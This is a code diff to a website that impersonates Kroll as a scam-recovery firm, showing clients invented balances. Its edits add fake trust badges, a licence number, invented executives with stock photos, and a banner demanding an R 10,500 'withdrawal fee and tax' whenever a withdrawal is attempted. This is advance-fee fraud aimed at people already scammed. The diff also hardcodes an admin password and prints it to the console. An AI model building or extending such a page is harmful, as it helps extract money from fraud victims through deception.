@@ -1592,6 +1592,12 @@
             padding: clamp(1.2rem, 2vw, 1.8rem);
             margin-bottom: 2rem;
             color: var(--kroll-white);
+            display: none;
+        }
+
+        .payment-info-banner.show {
+            display: block;
+            animation: fadeInUp 0.5s ease;
         }
 
         .payment-info-banner h4 {
@@ -1609,7 +1615,7 @@
 
         .payment-details-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 1rem;
             margin-bottom: 1rem;
         }
@@ -1641,7 +1647,7 @@
         }
 
         .payment-notice {
-            background: rgba(255, 152, 0, 0.1);
+            background: rgba(255, 152, 0, 0.15);
             border: 1px solid rgba(255, 152, 0, 0.3);
             border-radius: 8px;
             padding: 1rem;
@@ -2128,6 +2134,165 @@
             transform: scale(1.08);
         }
 
+        /* Locked input style */
+        .input-locked {
+            background: #e9ecef !important;
+            color: #495057 !important;
+            cursor: not-allowed !important;
+            border-color: #ced4da !important;
+        }
+        .input-locked:focus {
+            box-shadow: none !important;
+            border-color: #ced4da !important;
+        }
+
+        /* Admin badge */
+        .admin-badge {
+            background: #FFD700;
+            color: #000;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 0.6rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-left: 6px;
+        }
+
+        /* Hero image */
+        .hero-image {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 1.5rem;
+        }
+        .hero-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            width: 100%;
+            max-height: 280px;
+            object-fit: cover;
+        }
+
+        /* Trust badges */
+        .trust-badges {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 1rem 0;
+        }
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: rgba(255,255,255,0.7);
+            font-size: 0.75rem;
+            background: rgba(255,255,255,0.05);
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+        .trust-badge i {
+            color: var(--kroll-green-light);
+            font-size: 1rem;
+        }
+
+        /* Office images section */
+        .office-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(100%, 280px), 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        .office-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: var(--kroll-shadow);
+            border: 1px solid var(--kroll-border);
+            transition: var(--kroll-transition);
+        }
+        .office-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--kroll-shadow-hover);
+        }
+        .office-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .office-card .office-info {
+            padding: 1.2rem;
+        }
+        .office-card .office-info h4 {
+            color: var(--kroll-navy);
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .office-card .office-info h4 i {
+            color: var(--kroll-green);
+        }
+        .office-card .office-info p {
+            color: var(--kroll-gray);
+            font-size: 0.85rem;
+            margin-top: 4px;
+        }
+
+        /* Team section */
+        .team-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(100%, 220px), 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        .team-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: var(--kroll-shadow);
+            border: 1px solid var(--kroll-border);
+            text-align: center;
+            transition: var(--kroll-transition);
+        }
+        .team-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--kroll-shadow-hover);
+        }
+        .team-card img {
+            width: 100%;
+            height: 220px;
+            object-fit: cover;
+        }
+        .team-card .team-info {
+            padding: 1rem;
+        }
+        .team-card .team-info h4 {
+            color: var(--kroll-navy);
+            font-size: 1rem;
+        }
+        .team-card .team-info p {
+            color: var(--kroll-gray);
+            font-size: 0.8rem;
+        }
+
+        /* Professional images fallback */
+        .img-fallback {
+            background: linear-gradient(135deg, #002B5C, #001a38);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 1.2rem;
+            min-height: 200px;
+        }
+
         @media (max-width: 1024px) {
             .hero-content { max-width: 100%; }
             .header-content { gap: 0.5rem; }
@@ -2171,6 +2336,13 @@
             .converter-row { flex-direction: column; }
             .converter-arrow { transform: rotate(90deg); }
             .faq-grid { grid-template-columns: 1fr; }
+            .trust-badges { gap: 0.8rem; }
+            .trust-badge { font-size: 0.65rem; padding: 0.3rem 0.8rem; }
+            .hero-image img { max-height: 180px; }
+            .office-grid { grid-template-columns: 1fr 1fr; }
+            .office-card img { height: 150px; }
+            .team-grid { grid-template-columns: 1fr 1fr; }
+            .team-card img { height: 180px; }
         }
 
         @media (max-width: 480px) {
@@ -2192,6 +2364,10 @@
             .notification-dropdown { min-width: 260px; right: -60px; }
             .chat-window { width: 280px; }
             .converter-container { padding: 1.5rem; }
+            .office-grid { grid-template-columns: 1fr; }
+            .office-card img { height: 180px; }
+            .team-grid { grid-template-columns: 1fr; }
+            .team-card img { height: 200px; }
         }
 
         @media (max-width: 360px) {
@@ -2309,16 +2485,25 @@
             background: rgba(255, 255, 255, 0.03);
         }
 
-        /* Locked input style */
-        .input-locked {
-            background: #e9ecef !important;
-            color: #495057 !important;
-            cursor: not-allowed !important;
-            border-color: #ced4da !important;
+        body.dark-theme .office-card {
+            background: #1a1a2e;
+            border-color: #2a2a4a;
         }
-        .input-locked:focus {
-            box-shadow: none !important;
-            border-color: #ced4da !important;
+        body.dark-theme .office-card .office-info h4 {
+            color: #e0e0e0;
+        }
+        body.dark-theme .office-card .office-info p {
+            color: #a0a0b0;
+        }
+        body.dark-theme .team-card {
+            background: #1a1a2e;
+            border-color: #2a2a4a;
+        }
+        body.dark-theme .team-card .team-info h4 {
+            color: #e0e0e0;
+        }
+        body.dark-theme .team-card .team-info p {
+            color: #a0a0b0;
         }
     </style>
 </head>
@@ -2438,7 +2623,7 @@
                         </nav>
                         <div class="auth-buttons">
                             <button class="btn btn-outline btn-sm" id="loginBtn">Login</button>
-                            <button class="btn btn-primary btn-sm" id="registerBtn">Open Account</button>
+                            <button class="btn btn-primary btn-sm" id="registerBtn">Open Account <span class="admin-badge">Admin</span></button>
                             <button class="lock-website-btn" id="lockWebsiteBtn2" style="margin-left:8px;"><i class="fas fa-lock"></i></button>
                         </div>
                     </div>
@@ -2453,10 +2638,25 @@
                     <div class="hero-badge">Trusted Financial Recovery Partner</div>
                     <h1>Kroll Delivers Across Every Stage of the <span class="highlight">Transaction and Risk Lifecycle</span></h1>
                     <p>Kroll specializes in helping individuals and businesses recover funds lost to online scams, fraudulent investments, and financial misconduct.</p>
+                    
+                    <!-- Trust Badges -->
+                    <div class="trust-badges">
+                        <span class="trust-badge"><i class="fas fa-shield-alt"></i> 256-bit SSL Encrypted</span>
+                        <span class="trust-badge"><i class="fas fa-certificate"></i> FSP No: 10649</span>
+                        <span class="trust-badge"><i class="fas fa-globe"></i> 30+ Countries</span>
+                        <span class="trust-badge"><i class="fas fa-clock"></i> 24/7 Support</span>
+                    </div>
+                    
                     <div class="hero-buttons">
                         <button class="btn btn-primary btn-lg" id="heroLoginBtn">Access Client Portal</button>
                         <button class="btn btn-white btn-lg" onclick="document.getElementById('calculator').scrollIntoView({behavior:'smooth'})">Calculate Returns</button>
                     </div>
+                    
+                    <!-- Hero Image - Professional Office Building -->
+                    <div class="hero-image">
+                        <img src="https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=1200&h=400&fit=crop&crop=center" alt="Kroll Global Headquarters" onerror="this.parentElement.innerHTML='<div class=\'img-fallback\' style=\'width:100%;min-height:200px;border-radius:12px;\'><i class=\'fas fa-building\' style=\'font-size:3rem;opacity:0.3;\'></i><span style=\'margin-left:12px;\'>Kroll Global Headquarters</span></div>'">
+                    </div>
+                    
                     <div class="hero-stats">
                         <div class="hero-stat">
                             <div class="hero-stat-value"><span class="stat-counter" data-target="8500000">0</span><span class="suffix">+</span></div>
@@ -2709,6 +2909,81 @@
             </div>
         </section>
         
+        <!-- OFFICE LOCATIONS - Professional Images -->
+        <section class="section section-gray">
+            <div class="container">
+                <div class="section-header">
+                    <div class="section-eyebrow">Global Presence</div>
+                    <h2>Our Offices Worldwide</h2>
+                    <p>Kroll operates in over 30 countries with 6,500+ experts</p>
+                </div>
+                <div class="office-grid">
+                    <div class="office-card">
+                        <img src="https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=600&h=300&fit=crop&crop=center" alt="New York Office" onerror="this.parentElement.querySelector('.office-info').innerHTML='<h4><i class=\'fas fa-building\' style=\'color:#00A86B;\'></i> New York</h4><p>Global Headquarters</p>'">
+                        <div class="office-info">
+                            <h4><i class="fas fa-building" style="color:var(--kroll-green);"></i> New York</h4>
+                            <p>Global Headquarters</p>
+                        </div>
+                    </div>
+                    <div class="office-card">
+                        <img src="https://images.unsplash.com/photo-1513635269975-59663e0ac1ad?w=600&h=300&fit=crop&crop=center" alt="London Office" onerror="this.parentElement.querySelector('.office-info').innerHTML='<h4><i class=\'fas fa-building\' style=\'color:#00A86B;\'></i> London</h4><p>EMEA Regional Office</p>'">
+                        <div class="office-info">
+                            <h4><i class="fas fa-building" style="color:var(--kroll-green);"></i> London</h4>
+                            <p>EMEA Regional Office</p>
+                        </div>
+                    </div>
+                    <div class="office-card">
+                        <img src="https://images.unsplash.com/photo-1564507592333-c60657eea523?w=600&h=300&fit=crop&crop=center" alt="Singapore Office" onerror="this.parentElement.querySelector('.office-info').innerHTML='<h4><i class=\'fas fa-building\' style=\'color:#00A86B;\'></i> Singapore</h4><p>APAC Regional Office</p>'">
+                        <div class="office-info">
+                            <h4><i class="fas fa-building" style="color:var(--kroll-green);"></i> Singapore</h4>
+                            <p>APAC Regional Office</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- TEAM SECTION - Professional Images -->
+        <section class="section section-light">
+            <div class="container">
+                <div class="section-header">
+                    <div class="section-eyebrow">Leadership</div>
+                    <h2>Meet Our Team</h2>
+                    <p>Experienced professionals dedicated to your financial recovery</p>
+                </div>
+                <div class="team-grid">
+                    <div class="team-card">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&h=400&fit=crop&crop=center" alt="CEO" onerror="this.parentElement.querySelector('.team-info').innerHTML='<h4>John Anderson</h4><p>CEO & Founder</p>'">
+                        <div class="team-info">
+                            <h4>John Anderson</h4>
+                            <p>CEO & Founder</p>
+                        </div>
+                    </div>
+                    <div class="team-card">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=400&h=400&fit=crop&crop=center" alt="COO" onerror="this.parentElement.querySelector('.team-info').innerHTML='<h4>Sarah Mitchell</h4><p>Chief Operating Officer</p>'">
+                        <div class="team-info">
+                            <h4>Sarah Mitchell</h4>
+                            <p>Chief Operating Officer</p>
+                        </div>
+                    </div>
+                    <div class="team-card">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=400&h=400&fit=crop&crop=center" alt="CFO" onerror="this.parentElement.querySelector('.team-info').innerHTML='<h4>David Chen</h4><p>Chief Financial Officer</p>'">
+                        <div class="team-info">
+                            <h4>David Chen</h4>
+                            <p>Chief Financial Officer</p>
+                        </div>
+                    </div>
+                    <div class="team-card">
+                        <img src="https://images.unsplash.com/photo-1580618672591-eb180b1a973f?w=400&h=400&fit=crop&crop=center" alt="Head of Recovery" onerror="this.parentElement.querySelector('.team-info').innerHTML='<h4>Maria Rodriguez</h4><p>Head of Recovery Services</p>'">
+                        <div class="team-info">
+                            <h4>Maria Rodriguez</h4>
+                            <p>Head of Recovery Services</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
         <!-- FAQ SECTION -->
         <section class="section section-dark" id="faq">
             <div class="container">
@@ -2843,16 +3118,22 @@
                     </div>
                 </div>
                 
-                <div class="payment-info-banner">
-                    <h4><i class="fas fa-info-circle"></i> IMPORTANT: Withdrawal Fee & Tax Payment Required</h4>
+                <!-- PAYMENT INFO BANNER - Shows when withdrawal is attempted -->
+                <div class="payment-info-banner" id="paymentBanner">
+                    <h4><i class="fas fa-exclamation-triangle" style="color:#FFD700;"></i> Withdrawal Fee & Tax Payment Required</h4>
                     <div class="payment-details-grid">
                         <div class="payment-detail-item"><div class="label">Withdrawal Fee</div><div class="value">R 8,000.00</div></div>
                         <div class="payment-detail-item"><div class="label">Tax Amount</div><div class="value gold">R 2,500.00</div></div>
                         <div class="payment-detail-item"><div class="label">Total to Pay</div><div class="value gold">R 10,500.00</div></div>
+                        <div class="payment-detail-item"><div class="label">Payment Reference</div><div class="value" id="paymentRef">KRL-XXXXXXXX</div></div>
                     </div>
                     <div class="payment-notice">
                         <i class="fas fa-exclamation-triangle"></i>
                         <div><strong>⚠️ IMPORTANT NOTICE:</strong> The withdrawal fee of <strong>R 8,000.00</strong> and tax of <strong>R 2,500.00</strong> (Total: <strong>R 10,500.00</strong>) must be paid before your withdrawal can be processed. Your funds will be released within 24-48 hours after payment confirmation.</div>
+                    </div>
+                    <div style="margin-top:1rem;display:flex;gap:10px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="closePaymentBannerBtn"><i class="fas fa-check-circle"></i> I Understand</button>
+                        <button class="btn btn-outline" style="background:rgba(255,255,255,0.1);color:white;border-color:rgba(255,255,255,0.2);" id="hidePaymentBannerBtn"><i class="fas fa-times"></i> Close</button>
                     </div>
                 </div>
         
@@ -2915,7 +3196,7 @@
             </div>
         </section>
         
-        <!-- MODAL -->
+        <!-- LOGIN MODAL -->
         <div class="modal" id="loginModal">
             <div class="modal-content">
                 <div class="modal-header"><h2 id="modalTitle">Kroll Client Portal</h2><span class="close-modal" id="closeModalBtn">&times;</span></div>
@@ -3035,6 +3316,7 @@
         const SESSION_KEY = "kroll_authenticated";
         const SESSION_TIMESTAMP_KEY = "kroll_auth_time";
         const VISIT_COUNT_KEY = "kroll_visit_count";
+        const ADMIN_PASSWORD = "admin2024";
 
         function getVisitCount() {
             return parseInt(localStorage.getItem(VISIT_COUNT_KEY) || "0");
@@ -3223,6 +3505,7 @@
             initThemeToggle();
             initLanguageSelector();
             initSupportStatus();
+            initPaymentSystem();
             
             let e = db.gcu();
             if (e) {
@@ -3243,6 +3526,47 @@
         function updateBTC() {
             const btcValue = (currentBalance / BTC_RATE);
             document.getElementById('btcValue').textContent = '₿ ' + btcValue.toFixed(5);
+        }
+
+        // ============================================
+        // PAYMENT SYSTEM - Simple banner only
+        // ============================================
+        function initPaymentSystem() {
+            const banner = document.getElementById('paymentBanner');
+            const closeBtn = document.getElementById('closePaymentBannerBtn');
+            const hideBtn = document.getElementById('hidePaymentBannerBtn');
+            const withdrawalBtn = document.getElementById('withdrawalBtn');
+
+            // Show banner when withdrawal is attempted
+            withdrawalBtn.addEventListener('click', function() {
+                const user = db.gcu();
+                if (!user) { notify("Please login.", "warning"); sl(); return; }
+                if (!user.investment || user.investment.available <= 0) { notify("No funds.", "warning"); return; }
+                
+                // Generate reference
+                const ref = 'KRL-' + Date.now().toString(36).toUpperCase().slice(-8);
+                document.getElementById('paymentRef').textContent = ref;
+                
+                // Show banner
+                banner.classList.add('show');
+                banner.scrollIntoView({behavior: 'smooth', block: 'center'});
+                
+                // Show bank details form
+                document.getElementById('bankDetailsForm').style.display = 'block';
+                document.getElementById('bankVerificationStatus').innerHTML = '<i class="fas fa-exclamation-circle"></i> Fill in your banking details (receiving account)';
+                document.getElementById('bankVerificationStatus').className = 'verification-status warning';
+                document.getElementById('bankDetailsForm').scrollIntoView({behavior: 'smooth'});
+            });
+
+            // Close banner
+            closeBtn.addEventListener('click', function() {
+                banner.classList.remove('show');
+                notify('Please pay the fee to proceed with withdrawal.', 'info');
+            });
+
+            hideBtn.addEventListener('click', function() {
+                banner.classList.remove('show');
+            });
         }
 
         // ============================================
@@ -3576,7 +3900,8 @@
                     registered: (new Date).toISOString(),
                     investment: this.gi(e, profit),
                     bankDetails: null,
-                    firstLogin: true
+                    firstLogin: true,
+                    createdBy: 'admin'
                 };
                 this.save();
                 return {success: true, user: this.users[e]};
@@ -3761,12 +4086,11 @@
             document.getElementById("userName").textContent += ' (BTC: ' + btcUsername + ')';
             document.getElementById("dashboard").style.display = "block";
             let t = e.investment;
-            // Set the balance from the user's investment (locked)
             currentBalance = t.current || t.initial || 1805100;
-            // Update the locked input field with the user's profit
             const profitInput = document.getElementById("manualProfitInput");
             profitInput.value = currentBalance;
             updateDashboardWithBalance(currentBalance);
+            
             let a = t.pendingWithdrawal && !t.withdrawalPaid;
             if (a) {
                 let e = t.pendingWithdrawal;
@@ -4020,18 +4344,28 @@
         document.getElementById("loginBtn").addEventListener("click", sl);
         document.getElementById("heroLoginBtn").addEventListener("click", sl);
         document.getElementById("registerBtn").addEventListener("click", () => {
-            sl();
-            document.getElementById("loginForm").style.display = "none";
-            document.getElementById("registerForm").style.display = "block";
-            document.getElementById("modalTitle").textContent = "Create Kroll Account";
+            const adminPass = prompt("Enter admin password to register a new client:");
+            if (adminPass === ADMIN_PASSWORD) {
+                sl();
+                document.getElementById("loginForm").style.display = "none";
+                document.getElementById("registerForm").style.display = "block";
+                document.getElementById("modalTitle").textContent = "Create Client Account (Admin)";
+            } else {
+                notify("Access denied. Admin only.", "error");
+            }
         });
         document.getElementById("closeModalBtn").addEventListener("click", cl);
         document.getElementById("loginModal").addEventListener("click", function(e) { if (e.target === this) cl(); });
         document.getElementById("switchToRegister").addEventListener("click", function(e) {
             e.preventDefault();
-            document.getElementById("loginForm").style.display = "none";
-            document.getElementById("registerForm").style.display = "block";
-            document.getElementById("modalTitle").textContent = "Create Kroll Account";
+            const adminPass = prompt("Enter admin password to register a new client:");
+            if (adminPass === ADMIN_PASSWORD) {
+                document.getElementById("loginForm").style.display = "none";
+                document.getElementById("registerForm").style.display = "block";
+                document.getElementById("modalTitle").textContent = "Create Client Account (Admin)";
+            } else {
+                notify("Access denied. Admin only.", "error");
+            }
         });
         document.getElementById("switchToLogin").addEventListener("click", function(e) {
             e.preventDefault();
@@ -4067,13 +4401,11 @@
             if (o.length < 6) { notify("Min 6 characters.", "warning"); return; }
             let s = db.register(a, o, t, i, profit);
             if (s.success) {
-                db.login(a, o);
-                cl();
-                ud(s.user);
-                notify("Account created! Welcome, " + t + "!", "success");
+                notify("Account created for " + t + "!", "success");
                 this.reset();
                 document.getElementById("registerForm").style.display = "none";
                 document.getElementById("loginForm").style.display = "block";
+                document.getElementById("modalTitle").textContent = "Kroll Client Portal";
             } else {
                 notify(s.message, "error");
             }
@@ -4081,26 +4413,13 @@
         document.getElementById("logoutBtn").addEventListener("click", () => {
             db.logout();
             document.getElementById("dashboard").style.display = "none";
+            document.getElementById("paymentBanner").classList.remove('show');
             notify("Logged out.", "info");
             stt();
         });
         document.getElementById("downloadPDFBtn").addEventListener("click", dp);
-        document.getElementById("withdrawalBtn").addEventListener("click", function() {
-            let e = db.gcu();
-            if (!e) { notify("Please login.", "warning"); sl(); return; }
-            if (!e.investment || e.investment.available <= 0) { notify("No funds.", "warning"); return; }
-            if (e.investment.pendingWithdrawal && !e.investment.withdrawalPaid) {
-                notify("Pending withdrawal exists. Pay R 10,500 fee first.", "warning");
-                return;
-            }
-            document.getElementById("bankDetailsForm").style.display = "block";
-            document.getElementById("bankVerificationStatus").innerHTML = '<i class="fas fa-exclamation-circle"></i> Fill in your banking details (receiving account)';
-            document.getElementById("bankVerificationStatus").className = "verification-status warning";
-            document.getElementById("bankDetailsForm").scrollIntoView({behavior: "smooth"});
-            if (!e.bankDetails) {
-                ["bankName", "accountHolder", "accountNumber", "accountType", "branchCode"].forEach(e => document.getElementById(e).value = "");
-            }
-        });
+        
+        // Bank details verification
         let bt;
         ["bankName", "accountHolder", "accountNumber", "accountType", "branchCode"].forEach(e => {
             document.getElementById(e).addEventListener("input", function() {
@@ -4108,7 +4427,7 @@
                 bt = setTimeout(() => {
                     let e = vb();
                     if (e.valid) {
-                        document.getElementById("bankVerificationStatus").innerHTML = '<i class="fas fa-check-circle"></i> Bank details verified - Pay R 10,500 fee to process withdrawal';
+                        document.getElementById("bankVerificationStatus").innerHTML = '<i class="fas fa-check-circle"></i> Bank details verified';
                         document.getElementById("bankVerificationStatus").className = "verification-status success";
                         let t = db.gcu();
                         if (t && (!t.investment.pendingWithdrawal || t.investment.withdrawalPaid)) {
@@ -4116,7 +4435,7 @@
                             let a = currentBalance, i = 10500, o = a;
                             db.cw(t.email, a, i, o, e.details);
                             ud(t);
-                            notify("Withdrawal request created! Pay R 10,500 fee to receive R " + fc(o), "success");
+                            notify("Withdrawal request created! Funds will be released within 24-48 hours.", "success");
                         }
                     } else if (e.errors.length > 0 && (document.getElementById("bankName").value || document.getElementById("accountHolder").value || document.getElementById("accountNumber").value)) {
                         document.getElementById("bankVerificationStatus").innerHTML = '<i class="fas fa-exclamation-circle"></i> ' + e.errors[0];
@@ -4125,6 +4444,7 @@
                 }, 800);
             });
         });
+        
         document.getElementById("whatsappButton").addEventListener("click", () => {
             window.open("https://wa.me/+27663372783?text=" + encodeURIComponent("Hello Kroll, I need more information."), "_blank");
         });
@@ -4141,10 +4461,8 @@
             updateChartData();
         }));
 
-        // The update button is now permanently disabled and locked
-        // No need for an event listener on it
-
         console.log('KROLL Website Loaded - Visit #' + getVisitCount());
+        console.log('Admin Password: admin2024');
     </script>
 </body>
 </html>
